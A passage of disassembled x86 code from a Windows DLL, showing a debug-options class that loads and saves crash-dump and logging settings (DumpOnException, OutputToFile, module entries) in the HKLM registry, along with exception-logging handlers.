sub_6AF32572	proc near		; DATA XREF: .rdata:6AF61FECo
		push	13h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	ecx, [ebp-4Ch]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF32542
		retn
sub_6AF32572	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF325B5	proc near		; DATA XREF: .rdata:6AF61FFCo
		push	15h
		lea	ecx, [ebp-44h]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp-44h]
		call	Ordinal762
		mov	eax, [ebp-48h]
		push	dword ptr [eax]
		lea	eax, [ebp-24h]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp-24h]
		push	eax		; Src
		lea	ecx, [ebp-44h]
		call	Ordinal764
		lea	ecx, [ebp-44h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF32542
		retn
sub_6AF325B5	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3260A(char *Src)
sub_6AF3260A	proc near		; CODE XREF: Ordinal144+37Dp
					; Ordinal637+16p ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_25 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		mov	eax, dword_6AF682CC
		push	esi
		mov	esi, ecx
		mov	ecx, offset dword_6AF682CC
		mov	[ebp+var_10], esi
		call	dword ptr [eax+0Ch]
		add	eax, 10h
		mov	[esi], eax
		push	[ebp+Src]
		and	[ebp+var_4], 0
		mov	ecx, esi
		call	sub_6AF321A2
		test	al, al
		jnz	short loc_6AF32649
		push	[ebp+Src]	; Src
		mov	ecx, esi
		call	sub_6AF31B1D

loc_6AF32649:				; CODE XREF: sub_6AF3260A+33j
		mov	ecx, [ebp+var_C]
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4
sub_6AF3260A	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3265A	proc near		; CODE XREF: sub_6AF327B1+18p
					; Ordinal145+5Dp ...
		push	esi
		push	edi
		mov	edi, ecx
		lea	esi, [edi+4]
		mov	eax, [esi]
		push	dword ptr [eax+4] ; void *
		call	sub_6AF321C2
		mov	eax, [esi]
		mov	[eax+4], eax
		mov	eax, [esi]
		and	dword ptr [edi+8], 0
		mov	[eax], eax
		mov	esi, [esi]
		pop	edi
		mov	[esi+8], esi
		pop	esi
		retn
sub_6AF3265A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF32680	proc near		; CODE XREF: sub_6AF32BDF+4Fp

var_8		= byte ptr -8
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	edi
		mov	edi, ecx
		cmp	dword ptr [edi+8], 0
		jnz	short loc_6AF326A6
		push	[ebp+arg_8]
		push	dword ptr [edi+4]
		push	1
		push	[ebp+arg_0]
		call	sub_6AF31CCD
		mov	eax, [ebp+arg_0]
		jmp	loc_6AF327AC
; ---------------------------------------------------------------------------

loc_6AF326A6:				; CODE XREF: sub_6AF32680+Cj
		mov	eax, [edi+4]
		push	ebx
		mov	ebx, [ebp+arg_8]
		push	esi
		mov	esi, [ebp+arg_4]
		cmp	esi, [eax]
		jnz	short loc_6AF326D2
		lea	eax, [esi+0Ch]
		push	eax
		push	ebx
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	loc_6AF32797
		push	ebx
		push	esi
		mov	ecx, edi
		jmp	loc_6AF32788
; ---------------------------------------------------------------------------

loc_6AF326D2:				; CODE XREF: sub_6AF32680+33j
		cmp	esi, eax
		jnz	short loc_6AF326FD
		mov	eax, [eax+8]
		add	eax, 0Ch
		push	ebx
		push	eax
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	loc_6AF32797
		mov	eax, [edi+4]
		push	ebx
		push	dword ptr [eax+8]
		mov	ecx, edi
		push	0
		jmp	loc_6AF3278A
; ---------------------------------------------------------------------------

loc_6AF326FD:				; CODE XREF: sub_6AF32680+54j
		lea	eax, [esi+0Ch]
		push	eax
		push	ebx
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	short loc_6AF32742
		lea	ecx, [ebp+arg_8]
		mov	[ebp+arg_8], esi
		call	sub_6AF315CE
		mov	eax, [ebp+arg_8]
		add	eax, 0Ch
		push	ebx
		push	eax
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	short loc_6AF32742
		mov	eax, [ebp+arg_8]
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+15h], 0
		push	ebx
		mov	ecx, edi
		jz	short loc_6AF3273F
		push	eax

loc_6AF3273B:				; CODE XREF: sub_6AF32680+105j
		push	0
		jmp	short loc_6AF3278A
; ---------------------------------------------------------------------------

loc_6AF3273F:				; CODE XREF: sub_6AF32680+B8j
		push	esi
		jmp	short loc_6AF32788
; ---------------------------------------------------------------------------

loc_6AF32742:				; CODE XREF: sub_6AF32680+8Bj
					; sub_6AF32680+A9j
		lea	eax, [esi+0Ch]
		push	ebx
		push	eax
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	short loc_6AF32797
		lea	ecx, [ebp+arg_8]
		mov	[ebp+arg_8], esi
		call	sub_6AF31681
		mov	eax, [ebp+arg_8]
		cmp	eax, [edi+4]
		jz	short loc_6AF32778
		add	eax, 0Ch
		push	eax
		push	ebx
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	short loc_6AF32797
		mov	eax, [ebp+arg_8]

loc_6AF32778:				; CODE XREF: sub_6AF32680+E3j
		mov	ecx, [esi+8]
		cmp	byte ptr [ecx+15h], 0
		push	ebx
		mov	ecx, edi
		jz	short loc_6AF32787
		push	esi
		jmp	short loc_6AF3273B
; ---------------------------------------------------------------------------

loc_6AF32787:				; CODE XREF: sub_6AF32680+102j
		push	eax

loc_6AF32788:				; CODE XREF: sub_6AF32680+4Dj
					; sub_6AF32680+C0j
		push	1

loc_6AF3278A:				; CODE XREF: sub_6AF32680+78j
					; sub_6AF32680+BDj
		push	[ebp+arg_0]
		call	sub_6AF31CCD
		mov	eax, [ebp+arg_0]
		jmp	short loc_6AF327AA
; ---------------------------------------------------------------------------

loc_6AF32797:				; CODE XREF: sub_6AF32680+43j
					; sub_6AF32680+67j ...
		push	ebx
		lea	eax, [ebp+var_8]
		push	eax
		mov	ecx, edi
		call	sub_6AF321FB
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx

loc_6AF327AA:				; CODE XREF: sub_6AF32680+115j
		pop	esi
		pop	ebx

loc_6AF327AC:				; CODE XREF: sub_6AF32680+21j
		pop	edi
		leave
		retn	0Ch
sub_6AF32680	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF327B1(int, void *, int)
sub_6AF327B1	proc near		; CODE XREF: sub_6AF32C53+12p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		mov	ecx, [ebp+arg_4]
		cmp	ecx, [eax]
		jnz	short loc_6AF327D5
		cmp	[ebp+arg_8], eax
		jnz	short loc_6AF327D5
		mov	ecx, esi
		call	sub_6AF3265A
		mov	eax, [esi+4]
		mov	ecx, [eax]
		jmp	short loc_6AF327FA
; ---------------------------------------------------------------------------

loc_6AF327D5:				; CODE XREF: sub_6AF327B1+Fj
					; sub_6AF327B1+14j
		cmp	ecx, [ebp+arg_8]
		jz	short loc_6AF327FA
		push	edi

loc_6AF327DB:				; CODE XREF: sub_6AF327B1+46j
		mov	edi, ecx
		lea	ecx, [ebp+arg_4]
		call	sub_6AF31681
		push	edi		; void *
		lea	eax, [ebp+var_4]
		push	eax		; int
		mov	ecx, esi
		call	sub_6AF31E92
		mov	ecx, [ebp+arg_4]
		cmp	ecx, [ebp+arg_8]
		jnz	short loc_6AF327DB
		pop	edi

loc_6AF327FA:				; CODE XREF: sub_6AF327B1+22j
					; sub_6AF327B1+27j
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		pop	esi
		leave
		retn	0Ch
sub_6AF327B1	endp

; Exported entry 145.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal145
Ordinal145	proc near		; CODE XREF: Ordinal144+26p
					; Ordinal137+1Bp
					; DATA XREF: ...
		push	ebx
		push	esi
		mov	esi, ecx
		push	edi
		lea	ecx, [esi+5Ch]
		call	sub_6AF317A8
		xor	ebx, ebx
		xor	edi, edi
		inc	edi
		lea	ecx, [esi+8]
		mov	[esi+38h], ebx
		mov	[esi+3Ch], ebx
		mov	[esi+40h], edi
		mov	[esi+44h], edi
		mov	[esi+48h], ebx
		mov	[esi+4Ch], edi
		mov	[esi+50h], ebx
		mov	[esi+54h], edi
		mov	[esi+58h], ebx
		mov	dword ptr [esi+60h], 22h
		mov	[esi+64h], edi
		mov	[esi+68h], edi
		call	sub_6AF317A8
		lea	ecx, [esi+2Ch]
		mov	[esi+0Ch], edi
		mov	[esi+10h], ebx
		mov	[esi+14h], ebx
		mov	[esi+18h], edi
		mov	[esi+1Ch], edi
		mov	[esi+20h], edi
		mov	[esi+24h], edi
		mov	[esi+28h], edi
		call	sub_6AF3265A
		pop	edi
		mov	[esi+4], ebx
		pop	esi
		pop	ebx
		retn
Ordinal145	endp

; Exported entry 147.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal147
Ordinal147	proc near		; CODE XREF: Ordinal146+5p
					; DATA XREF: .rdata:off_6AF66098o

var_20		= byte ptr -20h
var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
Args		= byte ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+var_8]
		call	sub_6AF318C3
		lea	ecx, [ebp+var_4]
		call	sub_6AF318C3
		lea	eax, [ebp+var_4]
		push	eax		; int
		lea	eax, [ebp+var_8]
		push	eax		; int
		push	dword ptr [ebp+Args] ; Args
		call	Ordinal150
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF328AF
		push	offset aCdebugoptionsS ; "CDebugOptions::Save()	: BuildRegPath() "...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	loc_6AF32BC8
; ---------------------------------------------------------------------------

loc_6AF328AF:				; CODE XREF: Ordinal147+2Ej
		push	ebx
		push	edi		; Args
		lea	ecx, [ebp+var_14]
		call	Ordinal988
		push	1		; int
		mov	ebx, 20006h
		push	ebx		; samDesired
		push	[ebp+var_8]	; Args
		mov	edi, 80000002h
		push	edi		; hKey
		lea	ecx, [ebp+var_14]
		call	Ordinal993
		test	eax, eax
		jz	loc_6AF32A26
		push	dword ptr [esi+38h]
		lea	ecx, [ebp+var_14]
		push	offset aDumponnew ; "DumpOnNew"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+3Ch]
		lea	ecx, [ebp+var_14]
		push	offset aTerminateonnew ; "TerminateOnNew"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+40h]
		lea	ecx, [ebp+var_14]
		push	offset aThrowonnew ; "ThrowOnNew"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+44h]
		lea	ecx, [ebp+var_14]
		push	offset aDumponexceptio ; "DumpOnException"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+48h]
		lea	ecx, [ebp+var_14]
		push	offset aTerminateonexc ; "TerminateOnException"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+4Ch]
		lea	ecx, [ebp+var_14]
		push	offset aDumponpurecall ; "DumpOnPurecall"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+50h]
		lea	ecx, [ebp+var_14]
		push	offset aTerminateonpur ; "TerminateOnPurecall"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+54h]
		lea	ecx, [ebp+var_14]
		push	offset aDumponsecurity ; "DumpOnSecurity"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+58h]
		lea	ecx, [ebp+var_14]
		push	offset aTerminateonsec ; "TerminateOnSecurity"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		lea	eax, [esi+5Ch]
		push	eax		; int
		push	offset aDirectory ; "Directory"
		lea	ecx, [ebp+var_14]
		call	Ordinal1006
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+60h]
		lea	ecx, [ebp+var_14]
		push	offset aDumptype ; "DumpType"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+64h]
		lea	ecx, [ebp+var_14]
		push	offset aAppenddatetime ; "AppendDateTimeToFile"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+68h]
		lea	ecx, [ebp+var_14]
		push	offset aAppendversiont ; "AppendVersionToFile"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	1		; int
		push	ebx		; samDesired
		push	[ebp+var_4]	; Args
		lea	ecx, [ebp+var_14]
		push	edi		; hKey
		call	Ordinal993
		test	eax, eax
		jnz	short loc_6AF32A37

loc_6AF32A26:				; CODE XREF: Ordinal147+67j
		push	offset aCdebugoption_1 ; "CDebugOptions::Save()	: reg.Open() ==	F"...
		call	sub_6AF3102E
		xor	esi, esi
		jmp	loc_6AF32BBD
; ---------------------------------------------------------------------------

loc_6AF32A37:				; CODE XREF: Ordinal147+1B7j
		push	dword ptr [esi+4]
		lea	ecx, [ebp+var_14]
		push	offset aDebugtype ; "DebugType"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		lea	eax, [esi+8]
		push	eax		; int
		push	offset aDirectory ; "Directory"
		lea	ecx, [ebp+var_14]
		call	Ordinal1006
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+0Ch]
		lea	ecx, [ebp+var_14]
		push	offset aOutputtodebugg ; "OutputToDebugger"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+10h]
		lea	ecx, [ebp+var_14]
		push	offset aOutputtofile ; "OutputToFile"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+14h]
		lea	ecx, [ebp+var_14]
		push	offset aAppendprocessi ; "AppendProcessIdToFile"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+18h]
		lea	ecx, [ebp+var_14]
		push	offset aPrependthreadi ; "PrependThreadId"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+1Ch]
		lea	ecx, [ebp+var_14]
		push	offset aPrependprocess ; "PrependProcessId"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+20h]
		lea	ecx, [ebp+var_14]
		push	offset aPrependdatetim ; "PrependDateTime"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+24h]
		lea	ecx, [ebp+var_14]
		push	offset aPrependmodulen ; "PrependModuleName"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		push	dword ptr [esi+28h]
		lea	ecx, [ebp+var_14]
		push	offset aAppendnewline ;	"AppendNewLine"
		call	Ordinal1011
		test	eax, eax
		jz	loc_6AF32BB1
		mov	edi, offset pszSubKey ;	"Modules"
		push	edi		; pszSubKey
		lea	ecx, [ebp+var_14]
		call	Ordinal995
		lea	ecx, [ebp+var_20]
		call	Ordinal988
		push	1		; int
		push	ebx		; samDesired
		push	edi		; Args
		lea	ecx, [ebp+var_14]
		call	Ordinal1118
		push	eax		; hKey
		lea	ecx, [ebp+var_20]
		call	Ordinal993
		test	eax, eax
		jnz	short loc_6AF32B6E
		push	offset aCdebugoption_2 ; "CDebugOptions::Save()	: mapReg.Open()	="...

loc_6AF32B5C:				; CODE XREF: Ordinal147+342j
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_20]
		call	Ordinal990
		xor	esi, esi
		jmp	short loc_6AF32BBE
; ---------------------------------------------------------------------------

loc_6AF32B6E:				; CODE XREF: Ordinal147+2E8j
		mov	ecx, [esi+30h]
		mov	eax, [ecx]
		cmp	eax, ecx
		mov	dword ptr [ebp+Args], eax
		jz	short loc_6AF32B9D

loc_6AF32B7A:				; CODE XREF: Ordinal147+32Ej
		mov	ecx, [eax+0Ch]
		push	dword ptr [eax+10h]
		push	ecx
		lea	ecx, [ebp+var_20]
		call	Ordinal1011
		test	eax, eax
		jz	short loc_6AF32BAA
		lea	ecx, [ebp+Args]
		call	sub_6AF31681
		mov	eax, dword ptr [ebp+Args]
		cmp	eax, [esi+30h]
		jnz	short loc_6AF32B7A

loc_6AF32B9D:				; CODE XREF: Ordinal147+30Bj
		lea	ecx, [ebp+var_20]
		call	Ordinal990
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF32BBE
; ---------------------------------------------------------------------------

loc_6AF32BAA:				; CODE XREF: Ordinal147+31Ej
		push	offset aCdebugoption_3 ; "CDebugOptions::Save()	: reg.SetNumber()"...
		jmp	short loc_6AF32B5C
; ---------------------------------------------------------------------------

loc_6AF32BB1:				; CODE XREF: Ordinal147+7Fj
					; Ordinal147+97j ...
		push	offset aCdebugoption_3 ; "CDebugOptions::Save()	: reg.SetNumber()"...
		xor	esi, esi
		call	sub_6AF3102E

loc_6AF32BBD:				; CODE XREF: Ordinal147+1C5j
		pop	ecx

loc_6AF32BBE:				; CODE XREF: Ordinal147+2FFj
					; Ordinal147+33Bj
		lea	ecx, [ebp+var_14]
		call	Ordinal990
		pop	edi
		pop	ebx

loc_6AF32BC8:				; CODE XREF: Ordinal147+3Dj
		lea	ecx, [ebp+var_4]
		call	sub_6AF3789B
		lea	ecx, [ebp+var_8]
		call	sub_6AF3789B
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal147	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF32BDF	proc near		; CODE XREF: Ordinal144+390p

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_26 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		push	esi
		push	edi
		push	[ebp+arg_0]
		mov	edi, ecx
		call	sub_6AF318DC
		mov	esi, eax
		cmp	esi, [edi+4]
		jz	short loc_6AF32C10
		lea	eax, [esi+0Ch]
		push	eax
		push	[ebp+arg_0]
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	short loc_6AF32C40

loc_6AF32C10:				; CODE XREF: sub_6AF32BDF+1Dj
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_14]
		call	sub_6AF316B7
		and	[ebp+var_10], 0
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_14]
		push	eax
		push	esi
		lea	eax, [ebp+arg_0]
		push	eax
		mov	ecx, edi
		call	sub_6AF32680
		mov	ecx, [ebp+var_14]
		mov	esi, [eax]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D

loc_6AF32C40:				; CODE XREF: sub_6AF32BDF+2Fj
		mov	ecx, [ebp+var_C]
		pop	edi
		lea	eax, [esi+10h]
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4
sub_6AF32BDF	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF32C53	proc near		; CODE XREF: Ordinal141+18p

var_4		= dword	ptr -4

		push	ecx
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		mov	ecx, [eax]
		push	eax		; int
		push	ecx		; void *
		lea	eax, [esp+10h+var_4]
		push	eax		; int
		mov	ecx, esi
		call	sub_6AF327B1
		push	dword ptr [esi+4] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		pop	ecx
		pop	esi
		pop	ecx
		retn
sub_6AF32C53	endp

; Exported entry 144.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal144(DWORD Args)
		public Ordinal144
Ordinal144	proc near		; CODE XREF: Ordinal143+5p
					; DATA XREF: .rdata:off_6AF66098o

var_180		= dword	ptr -180h
var_17C		= dword	ptr -17Ch
var_178		= byte ptr -178h
cchValueName	= dword	ptr -158h
var_154		= dword	ptr -154h
var_150		= byte ptr -150h
var_144		= dword	ptr -144h
var_140		= dword	ptr -140h
var_13C		= dword	ptr -13Ch
var_138		= dword	ptr -138h
var_134		= byte ptr -134h
ValueName	= byte ptr -128h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
dwIndex		= byte ptr  8

		mov	eax, offset unknown_libname_27 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 174h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	[ebp+var_154], esi
		call	Ordinal145
		lea	ecx, [ebp+var_138]
		call	sub_6AF318C3
		and	[ebp+var_4], 0
		lea	ecx, [ebp+var_13C]
		call	sub_6AF318C3
		lea	eax, [ebp+var_13C]
		push	eax		; int
		lea	eax, [ebp+var_138]
		push	eax		; int
		push	dword ptr [ebp+dwIndex]	; Args
		mov	byte ptr [ebp+var_4], 1
		call	Ordinal150
		add	esp, 0Ch
		test	eax, eax
		jnz	short loc_6AF32CF6
		push	offset aCdebugoptionsL ; "CDebugOptions::Load()	: BuildRegPath() "...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	loc_6AF33139
; ---------------------------------------------------------------------------

loc_6AF32CF6:				; CODE XREF: Ordinal144+64j
		lea	ecx, [ebp+var_134]
		call	Ordinal988
		push	0		; int
		mov	edi, 20019h
		push	edi		; samDesired
		push	[ebp+var_138]	; Args
		mov	ebx, 80000002h
		push	ebx		; hKey
		lea	ecx, [ebp+var_134]
		mov	byte ptr [ebp+var_4], 2
		call	Ordinal993
		test	eax, eax
		jz	loc_6AF32E30
		lea	eax, [esi+38h]
		push	eax		; int
		push	offset aDumponnew ; "DumpOnNew"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+3Ch]
		push	eax		; int
		push	offset aTerminateonnew ; "TerminateOnNew"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+40h]
		push	eax		; int
		push	offset aThrowonnew ; "ThrowOnNew"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+44h]
		push	eax		; int
		push	offset aDumponexceptio ; "DumpOnException"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+48h]
		push	eax		; int
		push	offset aTerminateonexc ; "TerminateOnException"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+4Ch]
		push	eax		; int
		push	offset aDumponpurecall ; "DumpOnPurecall"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+50h]
		push	eax		; int
		push	offset aTerminateonpur ; "TerminateOnPurecall"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+54h]
		push	eax		; int
		push	offset aDumponsecurity ; "DumpOnSecurity"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+58h]
		push	eax		; int
		push	offset aTerminateonsec ; "TerminateOnSecurity"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+5Ch]
		push	eax		; int
		push	offset aDirectory ; "Directory"
		lea	ecx, [ebp+var_134]
		call	Ordinal1003
		lea	eax, [esi+60h]
		push	eax		; lpData
		push	offset aDumptype ; "DumpType"
		lea	ecx, [ebp+var_134]
		call	Ordinal1008
		lea	eax, [esi+64h]
		push	eax		; int
		push	offset aAppenddatetime ; "AppendDateTimeToFile"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+68h]
		push	eax		; int
		push	offset aAppendversiont ; "AppendVersionToFile"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010

loc_6AF32E30:				; CODE XREF: Ordinal144+A8j
		push	0		; int
		push	edi		; samDesired
		push	[ebp+var_13C]	; Args
		lea	ecx, [ebp+var_134]
		push	ebx		; hKey
		call	Ordinal993
		test	eax, eax
		jz	loc_6AF3312B
		lea	eax, [esi+4]
		push	eax		; lpData
		push	offset aDebugtype ; "DebugType"
		lea	ecx, [ebp+var_134]
		call	Ordinal1008
		lea	eax, [esi+8]
		push	eax		; int
		push	offset aDirectory ; "Directory"
		lea	ecx, [ebp+var_134]
		call	Ordinal1003
		lea	eax, [esi+0Ch]
		push	eax		; int
		push	offset aOutputtodebugg ; "OutputToDebugger"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+10h]
		push	eax		; int
		push	offset aOutputtofile ; "OutputToFile"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+14h]
		push	eax		; int
		push	offset aAppendprocessi ; "AppendProcessIdToFile"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+18h]
		push	eax		; int
		push	offset aPrependthreadi ; "PrependThreadId"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+1Ch]
		push	eax		; int
		push	offset aPrependprocess ; "PrependProcessId"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+20h]
		push	eax		; int
		push	offset aPrependdatetim ; "PrependDateTime"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+24h]
		push	eax		; int
		push	offset aPrependmodulen ; "PrependModuleName"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	eax, [esi+28h]
		push	eax		; int
		push	offset aAppendnewline ;	"AppendNewLine"
		lea	ecx, [ebp+var_134]
		call	Ordinal1010
		lea	ecx, [ebp+var_150]
		call	Ordinal988
		xor	ebx, ebx
		push	ebx		; int
		push	edi		; samDesired
		push	offset pszSubKey ; "Modules"
		lea	ecx, [ebp+var_134]
		mov	byte ptr [ebp+var_4], 3
		call	Ordinal1118
		push	eax		; hKey
		lea	ecx, [ebp+var_150]
		call	Ordinal993
		test	eax, eax
		jz	loc_6AF33120
		lea	ecx, [esi+2Ch]
		call	sub_6AF3265A
		mov	dword ptr [ebp+dwIndex], ebx
		mov	[ebp+var_144], ebx

loc_6AF32F5D:				; CODE XREF: Ordinal144+49Dj
		push	ebx		; lpcbData
		push	ebx		; lpData
		push	ebx		; lpType
		push	ebx		; lpReserved
		lea	eax, [ebp+cchValueName]
		push	eax		; lpcchValueName
		lea	eax, [ebp+ValueName]
		push	eax		; lpValueName
		push	dword ptr [ebp+dwIndex]	; dwIndex
		lea	ecx, [ebp+var_150]
		mov	[ebp+cchValueName], 104h
		call	Ordinal1016
		cmp	eax, ebx
		jz	short loc_6AF32FB3
		cmp	eax, 103h
		jz	loc_6AF33120
		push	offset aCdebugoption_4 ; "CDebugOptions::Load()	: mapReg.EnumValu"...

loc_6AF32F9B:				; CODE XREF: Ordinal144+35Aj
		call	sub_6AF3102E
		pop	ecx

loc_6AF32FA1:				; CODE XREF: Ordinal144+48Fj
		lea	ecx, [ebp+var_150]
		call	Ordinal990
		xor	esi, esi
		jmp	loc_6AF3312E
; ---------------------------------------------------------------------------

loc_6AF32FB3:				; CODE XREF: Ordinal144+30Bj
		inc	dword ptr [ebp+dwIndex]
		lea	eax, [ebp+var_144]
		push	eax		; int
		lea	eax, [ebp+ValueName]
		push	eax		; lpValueName
		lea	ecx, [ebp+var_150]
		call	Ordinal1010
		test	eax, eax
		jnz	short loc_6AF32FDA
		push	offset aCdebugoption_5 ; "CDebugOptions::Load()	: mapReg.GetNumbe"...
		jmp	short loc_6AF32F9B
; ---------------------------------------------------------------------------

loc_6AF32FDA:				; CODE XREF: Ordinal144+353j
		push	offset aCdebugoption_6 ; "CDebugOptions::Load()"
		lea	ecx, [ebp+var_178]
		call	Ordinal751
		lea	eax, [ebp+ValueName]
		push	eax		; Src
		lea	ecx, [ebp+var_140]
		mov	byte ptr [ebp+var_4], 5
		call	sub_6AF3260A
		lea	eax, [ebp+var_140]
		push	eax
		lea	ecx, [esi+2Ch]
		mov	byte ptr [ebp+var_4], 6
		call	sub_6AF32BDF
		mov	ecx, [ebp+var_144]
		mov	[eax], ecx
		mov	ecx, [ebp+var_140]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
